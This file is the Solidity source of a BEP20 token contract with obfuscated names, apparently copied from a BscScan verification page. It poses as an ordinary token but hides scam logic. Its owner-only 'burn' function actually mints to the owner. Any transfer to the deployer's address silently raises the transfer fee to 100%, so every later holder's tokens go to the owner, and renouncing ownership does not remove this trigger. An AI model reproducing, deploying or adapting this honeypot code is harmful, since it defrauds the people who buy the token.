/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 11:17:11 GMT
 */
pragma solidity >=0.4.11;
contract BuFNHR {
address public  Fwnhkv = address(0);
address public  EepHdN = address(0);
uint256 public  HDgwuS = 10000000000000000;
uint256 private  ravbea = 10000000000000;
uint256 public  WgiyIE = 100000000000000000000000;
uint256 public  LHmZqJ = 100000000000000000;
uint256 public  wLARst = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  fCrcel = address(0);
uint256 public  Sjqrch = 10000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  name = "XVPwIR";
address public  RUmZGp = address(0);
address public  BXXrWu = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant Avpseq = 9+1;
uint256 public  phzJSC = 100000000000000000000;
string public  symbol = "cQUnFE";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  BDuYWf = 10000000000000000000;
address public  ijeVYC = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
uint256 public  cZuYvt = 100000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  hsawEE = address(0);
mapping (address => uint256) public balanceOf;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "mEaUNC");
require(to != address(0), "mEaUNC");
require(amount <= balanceOf[from], "mEaUNC");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* Avpseq/ravbea ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==fCrcel){
ravbea = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor () {
fCrcel = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}